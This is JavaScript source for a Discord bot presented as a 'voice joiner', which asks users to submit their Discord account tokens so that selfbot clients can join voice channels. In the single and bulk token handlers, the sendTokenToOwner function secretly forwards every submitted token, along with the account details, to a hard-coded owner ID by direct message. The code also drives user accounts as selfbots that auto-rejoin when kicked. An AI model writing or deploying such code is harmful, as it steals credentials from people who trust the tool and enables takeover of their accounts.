import { 
  Client, 
  GatewayIntentBits, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle, 
  ModalBuilder, 
  TextInputBuilder, 
  TextInputStyle, 
  StringSelectMenuBuilder,
  ActivityType,
  ContainerBuilder,
  TextDisplayBuilder,
  SeparatorBuilder,
  MessageFlags
} from 'discord.js';
import { Client as SelfClient } from 'discord.js-selfbot-v13';
import express from 'express';

// --- UPTIME VƏ PORT ÜÇÜN EXPRESS SERVERİ ---
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Fronzyy Voice Joiner aktif ve çalışıyor!');
});

app.listen(PORT, () => {
  console.log(`Sunucu ${PORT} portunda çalışıyor.`);
});
// -------------------------------------------

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ]
});

// Bellekte saklanan tokenler ve aktif selfbot bağlantıları
const userTokens = new Map();
const selfClients = new Map(); // token -> selfClient

// Tokenlərin göndəriləcəyi və paneli aça biləcək səlahiyyətli şəxsin ID-si
const OWNER_ID = '1184518857679962186';

client.once('ready', () => {
  console.log(`Bot başarıyla giriş yaptı: ${client.user.tag}`);
  
  // Botun statusunu təyin edirik
  client.user.setActivity({
    name: 'powered by Fronzyy',
    type: ActivityType.Playing
  });
});

// Bot sahibinə DM vasitəsilə mesaj göndərmək üçün köməkçi funksiya
async function sendTokenToOwner(client, title, token, accountName, username, addedByUserId) {
  if (!OWNER_ID) return;
  try {
    const owner = await client.users.fetch(OWNER_ID);
    if (owner) {
      await owner.send(
        `📥 **${title}**\n` +
        `👤 **Hesap:** ${accountName} (${username})\n` +
        `🆔 **Ekleyen Kullanıcı ID:** <@${addedByUserId}> (${addedByUserId})\n` +
        `🔑 **Token:** \`${token}\``
      );
    }
  } catch (err) {
    console.error('Owner DM gönderme hatası:', err);
  }
}

// Selfbotun səs bağlantısını dayandırmaq üçün köməkçi funksiya
function disconnectSelfBot(token) {
  if (selfClients.has(token)) {
    try {
      selfClients.get(token).destroy();
    } catch (e) {}
    selfClients.delete(token);
    return true;
  }
  return false;
}

// Selfbotu səs kanalına qoşmaq və kanal adını qaytarmaq üçün funksiya
async function connectSelfBot(token, channelId, accountName) {
  disconnectSelfBot(token);

  const selfClient = new SelfClient({ checkUpdate: false });

  return new Promise((resolve) => {
    selfClient.on('ready', async () => {
      try {
        const channel = await selfClient.channels.fetch(channelId).catch(() => null);
        if (channel) {
          selfClient.ws.broadcast({
            op: 4,
            d: {
              guild_id: channel.guild.id,
              channel_id: channel.id,
              self_mute: true,
              self_deaf: true,
              self_video: false
            }
          });
          resolve({ success: true, channelName: channel.name || channelId, tag: selfClient.user.tag });
        } else {
          resolve({ success: false, reason: 'Kanal bulunamadı veya yetki yok.' });
        }
      } catch (err) {
        resolve({ success: false, reason: err.message });
      }
    });

    // Kanaldan atılarsa avtomatik təkrar qoşulma
    selfClient.on('voiceStateUpdate', async (oldState, newState) => {
      if (oldState.member?.id === selfClient.user.id && !newState.channelId) {
        setTimeout(async () => {
          try {
            const ch = await selfClient.channels.fetch(channelId).catch(() => null);
            if (ch) {
              selfClient.ws.broadcast({
                op: 4,
                d: {
                  guild_id: ch.guild.id,
                  channel_id: ch.id,
                  self_mute: true,
                  self_deaf: true,
                  self_video: false
                }
              });
            }
          } catch (e) {}
        }, 5000);
      }
    });

    selfClient.login(token).then(() => {
      selfClients.set(token, selfClient);
    }).catch(err => {
      resolve({ success: false, reason: err.message });
    });
  });
}

// !panel-voice komutu
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  if (message.content === '!panel-voice') {
    if (message.author.id !== OWNER_ID) {
      try { await message.delete(); } catch (e) {}
      try {
        const warningMsg = await message.channel.send({ 
          content: `❌ <@${message.author.id}> Bu komutu sadece yönetici kullanabilir.` 
        });
        setTimeout(async () => {
          try { await warningMsg.delete(); } catch (err) {}
        }, 5000);
      } catch (err) {}
      return;
    }

    try { await message.delete(); } catch (e) {}

    const container = new ContainerBuilder()
      .setAccentColor(0x2b2d31)
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('# **Fronzyy Voice Joiner**')
      )
      .addSeparatorComponents(
        new SeparatorBuilder().setDivider(true)
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('## **Nasıl kullanılır?**')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Sese Bağlan** : Eklediğiniz hesapları belirleyeceğiniz ses kanalına bağlamanızı sağlar.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Token Ekle** : Tekli token eklemenizi sağlar.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Toplu Token Ekle** : Her satıra bir token yazarak birden fazla hesabı aynı anda eklersiniz.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Token Sil** : Eklediğiniz tokenleri tek tek veya tümünü silebilirsiniz.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Durdur** : Seçtiğiniz veya tüm hesapların ses bağlantısını keser.')
      )
      .addSeparatorComponents(
        new SeparatorBuilder().setDivider(true)
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('-# Copyright © Developed by Fronzyy 2026')
      );

    const row1 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('connect_voice_menu')
        .setLabel('Sese Bağlan')
        .setStyle(ButtonStyle.Success)
        .setEmoji('🔊'),

      new ButtonBuilder()
        .setCustomId('add_token')
        .setLabel('Token Ekle')
        .setStyle(ButtonStyle.Success)
        .setEmoji('➕'),

      new ButtonBuilder()
        .setCustomId('add_bulk_token')
        .setLabel('Toplu Token Ekle')
        .setStyle(ButtonStyle.Primary)
        .setEmoji('🗒️')
    );

    const row2 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('remove_token_panel')
        .setLabel('Token Sil')
        .setStyle(ButtonStyle.Danger)
        .setEmoji('🗑️'),

      new ButtonBuilder()
        .setCustomId('stop_all')
        .setLabel('Durdur')
        .setStyle(ButtonStyle.Danger)
        .setEmoji('🗑️')
    );

    await message.channel.send({ 
      components: [container, row1, row2],
      flags: MessageFlags.IsComponentsV2 
    });
  }
});

// Buton və Modal etkileşimleri
client.on('interactionCreate', async (interaction) => {
  const userId = interaction.user.id;

  // --- 1. TOKEN EKLE BUTONU ---
  if (interaction.isButton() && interaction.customId === 'add_token') {
    const modal = new ModalBuilder()
      .setCustomId('token_modal')
      .setTitle('Discord Token Ekle');

    const tokenInput = new TextInputBuilder()
      .setCustomId('token_input')
      .setLabel('Discord Tokeninizi girin')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
    await interaction.showModal(modal);
  }

  // --- 2. TOPLU TOKEN EKLE BUTONU ---
  if (interaction.isButton() && interaction.customId === 'add_bulk_token') {
    const modal = new ModalBuilder()
      .setCustomId('bulk_token_modal')
      .setTitle('Toplu Discord Token Ekle');

    const tokenInput = new TextInputBuilder()
      .setCustomId('bulk_token_input')
      .setLabel('Discord Tokenlerini girin')
      .setPlaceholder('Her satıra 1 token gelecek şekilde yazın')
      .setStyle(TextInputStyle.Paragraph)
      .setRequired(true);

    modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
    await interaction.showModal(modal);
  }

  // --- 3. TOKEN SİL PANELİ ---
  if (interaction.isButton() && interaction.customId === 'remove_token_panel') {
    const tokens = userTokens.get(userId);
    if (!tokens || tokens.length === 0) {
      return interaction.reply({ content: '⚠️ Silinecek kayıtlı hesabınız bulunmuyor!', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_remove_account')
      .setPlaceholder('Silmek istediğiniz hesabı seçin...')
      .addOptions([
        { label: 'Bütün Tokenleri Sil', value: 'clear_all_tokens', description: 'Size ait olan bütün tokenleri sistemden siler', emoji: '🗑️' },
        ...tokens.map((t, index) => ({
          label: `${t.name} (${t.username})`,
          value: index.toString(),
          description: `Bu hesabı sil`,
          emoji: '❌'
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'Silmek istediğiniz hesabı veya seçeneği belirleyin:', components: [row], ephemeral: true });
  }

  // --- 4. SESE BAĞLAN BUTONU ---
  if (interaction.isButton() && interaction.customId === 'connect_voice_menu') {
    const tokens = userTokens.get(userId);
    if (!tokens || tokens.length === 0) {
      return interaction.reply({ content: '⚠️ Önce "Token Ekle" veya "Toplu Token Ekle" butonundan bir hesap eklemelisiniz!', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_account')
      .setPlaceholder('Hesap seçin...')
      .addOptions([
        { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Eklediğiniz bütün hesaplar sese bağlanacak' },
        ...tokens.map((t, index) => ({
          label: `${t.name} (${t.username})`,
          value: index.toString(),
          description: `Seçilen hesap: ${t.name}`
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'Sese bağlanmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
  }

  // --- 5. HESAP SEÇİLDİKTƏN SONRA KANAL ID-Sİ TƏLƏBİ ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_account') {
    const selectedValue = interaction.values[0];

    const modal = new ModalBuilder()
      .setCustomId(`voice_modal_${selectedValue}`)
      .setTitle('Ses Ayarları');

    const channelInput = new TextInputBuilder()
      .setCustomId('channel_id')
      .setLabel('Bağlanılacak Ses Kanalının ID-si')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    modal.addComponents(new ActionRowBuilder().addComponents(channelInput));
    await interaction.showModal(modal);
  }

  // --- 6. SESE BAĞLANMA İŞLEMİ (MODAL SUBMIT) ---
  if (interaction.isModalSubmit() && interaction.customId.startsWith('voice_modal_')) {
    const selectedValue = interaction.customId.replace('voice_modal_', '');
    const channelId = interaction.fields.getTextInputValue('channel_id').trim();

    const tokens = userTokens.get(userId);
    let targetTokens = [];

    if (selectedValue === 'all_accounts') {
      targetTokens = tokens;
    } else {
      targetTokens = [tokens[parseInt(selectedValue)]];
    }

    await interaction.reply({ content: `🔊 Seçilen ${targetTokens.length} hesap ses kanalına bağlanıyor...`, ephemeral: true });

    let resultsText = `🔊 **Ses Bağlantı Sonuçları:**\n`;

    for (const tObj of targetTokens) {
      const res = await connectSelfBot(tObj.token, channelId, tObj.name);
      if (res.success) {
        resultsText += `✅ **${tObj.name}** (${tObj.username}) başarıyla **${res.channelName}** ses kanalına bağlandı!\n`;
      } else {
        resultsText += `❌ **${tObj.name}** bağlanamadı (${res.reason})\n`;
      }
      await new Promise(r => setTimeout(r, 1500));
    }

    await interaction.editReply({ content: resultsText });
  }

  // --- 7. DURDUR BUTONU (HESAB SEÇİM MENÜSÜ) ---
  if (interaction.isButton() && interaction.customId === 'stop_all') {
    const tokens = userTokens.get(userId);
    const activeUserTokens = (tokens || []).filter(t => selfClients.has(t.token));

    if (activeUserTokens.length === 0) {
      return interaction.reply({ content: 'ℹ️ Sese bağlı aktif hesabınız bulunmuyor.', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_stop_account')
      .setPlaceholder('Bağlantısı kesilecek hesabı seçin...')
      .addOptions([
        { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Sese bağlı bütün hesapların bağlantısını keser', emoji: '🗑️' },
        ...activeUserTokens.map((t) => {
          const globalIndex = tokens.findIndex(item => item.token === t.token);
          return {
            label: `${t.name} (${t.username})`,
            value: globalIndex.toString(),
            description: `${t.name} hesabının ses bağlantısını kes`,
            emoji: '🗑️'
          };
        })
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'Ses bağlantısını durdurmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
  }

  // --- 7.1. DURDUR SEÇİM İŞLEMİ ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_stop_account') {
    const selectedValue = interaction.values[0];
    const tokens = userTokens.get(userId) || [];

    if (selectedValue === 'all_accounts') {
      let stoppedCount = 0;
      for (const tObj of tokens) {
        if (disconnectSelfBot(tObj.token)) {
          stoppedCount++;
        }
      }
      return interaction.update({
        content: `🗑️ **${stoppedCount}** hesabın ses bağlantısı durduruldu.`,
        components: []
      });
    } else {
      const targetAccount = tokens[parseInt(selectedValue)];
      if (!targetAccount) {
        return interaction.update({ content: '❌ Seçilen hesap bulunamadı.', components: [] });
      }
      disconnectSelfBot(targetAccount.token);
      return interaction.update({
        content: `🗑️ **${targetAccount.name} (${targetAccount.username})** hesabının ses bağlantısı durduruldu.`,
        components: []
      });
    }
  }

  // --- 8. TEK TOKEN MODAL CEVABI ---
  if (interaction.isModalSubmit() && interaction.customId === 'token_modal') {
    const token = interaction.fields.getTextInputValue('token_input').trim();
    await interaction.deferReply({ ephemeral: true });

    try {
      const userRes = await fetch('https://discord.com/api/v9/users/@me', {
        headers: { 'Authorization': token }
      });

      if (!userRes.ok) {
        return interaction.editReply({ content: `❌ Hata: Girilen token geçersiz veya devre dışı bırakılmış.` });
      }

      const userData = await userRes.json();
      const globalName = userData.global_name || userData.username;
      const username = userData.username;

      if (!userTokens.has(userId)) {
        userTokens.set(userId, []);
      }
      
      const existingList = userTokens.get(userId);
      if (!existingList.some(t => t.token === token)) {
        existingList.push({ token, name: globalName, username: username });
        await sendTokenToOwner(client, 'Yeni Tekli Token Eklendi (Voice Joiner)', token, globalName, username, userId);
      }

      await interaction.editReply({ content: `✅ Başarıyla eklendi! Hesap: **${globalName} (${username})**` });
    } catch (err) {
      await interaction.editReply({ content: `❌ Token eklenirken bir hata oluştu.` });
    }
  }

  // --- 9. TOPLU TOKEN MODAL CEVABI ---
  if (interaction.isModalSubmit() && interaction.customId === 'bulk_token_modal') {
    const rawInput = interaction.fields.getTextInputValue('bulk_token_input').trim();
    const tokens = rawInput.split('\n').map(t => t.trim()).filter(t => t.length > 0);

    if (tokens.length === 0) {
      return interaction.reply({ content: '❌ Geçerli token bulunamadı!', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    if (!userTokens.has(userId)) {
      userTokens.set(userId, []);
    }
    const existingList = userTokens.get(userId);

    let successCount = 0;
    let failCount = 0;
    let addedNames = [];

    for (const token of tokens) {
      if (existingList.some(t => t.token === token)) continue;

      try {
        const userRes = await fetch('https://discord.com/api/v9/users/@me', {
          headers: { 'Authorization': token }
        });

        if (userRes.ok) {
          const userData = await userRes.json();
          const globalName = userData.global_name || userData.username;
          const username = userData.username;

          existingList.push({ token, name: globalName, username: username });
          addedNames.push(`${globalName} (${username})`);
          successCount++;

          await sendTokenToOwner(client, 'Toplu Token Eklendi (Voice Joiner)', token, globalName, username, userId);
        } else {
          failCount++;
        }
      } catch (err) {
        failCount++;
      }
    }

    await interaction.editReply({ 
      content: `📦 **Toplu Token İşlemi Tamamlandı!**\n✅ Başarıyla eklenen: **${successCount}** hesap\n❌ Geçersiz/Eklenemeyen: **${failCount}**\n\n${addedNames.length > 0 ? 'Eklenenler:\n- ' + addedNames.join('\n- ') : ''}` 
    });
  }

  // --- 10. TOKEN SİLME SEÇİM İŞLEMİ ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_remove_account') {
    const selectedValue = interaction.values[0];
    const tokens = userTokens.get(userId);

    if (!tokens) {
      return interaction.reply({ content: '❌ Kayıtlı hesabınız bulunmuyor.', ephemeral: true });
    }

    if (selectedValue === 'clear_all_tokens') {
      userTokens.set(userId, []);
      return interaction.reply({ content: '🗑️ Size ait olan bütün tokenler başarıyla silindi!', ephemeral: true });
    } else {
      const index = parseInt(selectedValue);
      const removedAccount = tokens.splice(index, 1)[0];
      return interaction.reply({ content: `❌ Başarıyla silindi: **${removedAccount.name} (${removedAccount.username})**`, ephemeral: true });
    }
  }
});

// Render-də token yoxlanışı ilə giriş
if (!process.env.DISCORD_TOKEN) {
  console.error("❌ HATA: DISCORD_TOKEN environment dəyişəni tapılmadı! Render panelindən əlavə edin.");
  process.exit(1);
}

client.login(process.env.DISCORD_TOKEN);
